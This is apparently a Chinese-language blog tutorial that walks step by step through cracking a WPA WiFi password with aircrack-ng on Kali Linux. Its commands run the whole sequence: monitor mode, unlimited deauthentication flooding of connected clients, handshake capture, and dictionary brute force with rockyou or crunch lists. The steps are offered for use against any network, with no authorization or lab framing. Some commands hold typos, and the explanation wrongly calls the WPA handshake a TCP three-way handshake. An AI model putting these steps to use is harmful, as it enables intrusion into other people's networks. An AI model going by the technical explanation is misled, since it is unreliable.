---
title: Kali-Linux 暴力破解WiFi密码
date: 2021/9/28 00:12:50
tags:
  - Kali Linux
  - 教学文档
categories:
  - 程序
cover: https://tse4-mm.cn.bing.net/th/id/OIP-C.8z9BftgYnWvtNa5Vp2Y-CgHaE8?pid=ImgDet&rs=1
copyright_author: Arvin
copyright_author_href: https://github.com/ArvinRoad
copyright_info: 此文章版權歸Arvin所有，如有轉載，請註明來自原作者
---

### 前期准备
**硬件设备**：
> 操作机器
> 无线渗透网卡 | 有线渗透网卡

**软件**：
> Kali Linux 系统 （我版本是 2021.1）
> Aircrack-NG
> 爆破字典 （可以是 Kali Linux 自带的）
> 有 wifi 环境下

---

### 实现代码
**首先我们要建立监听热点环境机制**
```shell
# 检查网卡是否连接成功,成功会看到 wlan0 出现
ifconfig -a

#  kill 一切干扰无线网卡监听热点的信号
airmon-ngcheck kill

# wlan0是无线网卡的名称,载入网卡开启网络监听
airmon-ng start wlan0

# 此时无线网卡的名称将变成 wlan0mon ,表示开启网络监听
ifconfig -a

# 该操作是开始监听周围WiFi热点, 显示各个WiFi热点（ctrl C停止监听）
airodump-ng wlan0mon

# 选取WiFi热点进行攻击, 该操作是抓包,当新建一个终端去攻击连接WiFi的设备掉线后，我们抓到的tcp包就是存储在/root/桌面这个路径上
airodump-ng -c 频道(ch) --bssid bssid -w /root/桌面 (用来存储抓包的目录) 网卡名

# 新建一个终端：键入下面代码
aireplay-ng -0 0 -c 客户端MAX(STATION) -a bssid 网卡名 (一般为wlan0mon)

# 此时返回前一个终端,可看到抓到的tcp包,在头部位置
WPA handshake :  bssid 

# 暴力破解, 解压kali自带的字典文件  路径：/usr/share/wordlists/rockyou.txt.gz
gzip -d/usr/share/wordlists/rockyou.txt.gz

# 开始爆破 aircrack-ng -w 字典路径（kali有自带的字典文件，解压路径为:/usr/share/wordlists/rockyou.txt） /root/桌面/桌面-01.cap（握手包）
aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/桌面-0.1.cap
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 88:C3:97:31:E8:9D test-01.cap
aircrack-ng -w <指定字典> -b <目的路由MAC地址> <抓到的握手包>

# 关闭网络监听
airmon-ng stop wlan0mon
```
```shell
# 使用 crunch 
crunch

# 10 10表示制作一个10位数的密码， 012表示密码中包含数字012xy这些元素，/root/12345.txt表示密码文本储存的路径以及名字
crunch 10 10 012 xy>>/root/12345.txt

# 使用aircrack-ng -w /root/12345.txt /root/cap/er8-01.cap（ircrack-ng -w 字典路径 握手包路径） 进行wifi密码破解
```

### 原理流程介绍
**airepaly-ng -0 0 -c 客户端MAX(STATION) -a bssid 网卡名 (一般为wlan0mon) 代码解释**:
> 0为用deauth洪水攻击WiFi设备的次数，0为无限，-0 5则攻击5次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码
> 为什么要穷举，而不是直接从数据包里面获取密码？因为数据包里面的密码是哈希加密的，哈希加密只能正向，不能反向推导，所以需要一个个正向推导，直到找到正确的密码。

> 暴力破解就是穷举法，将密码字典中每一个密码依次去与握手包中的密码进行匹配，直到匹配成功。能否成功破解wifi密码取决于密码字典本身是否包含了这个密码。破解的时间取决于CPU的运算速度以及wifi密码本身的复杂程度。如果WiFi密码设得足够复杂，即使有一个好的密码字典，破解成功也可能要数小时甚至数天。

**暴力破解思路**:
> kali系统接入无线网卡，并通过里面的aircrack程序开始监听周围热点，选择一个WiFi热点，用aircrack去攻击一台连接了该WiFi热点的设备，使其掉线，之后这台设备（手机/电脑）肯定会再次自动来连接，我方利用伪装的挂载设备去接受设备（电脑/手机）发送的tcp三次握手数据包(里面包含了加密的WiFi密码)。此时我们只要用kali里面自带的密码字典文件去穷举该数据包，直到找到WiFi密码为止就成功了。



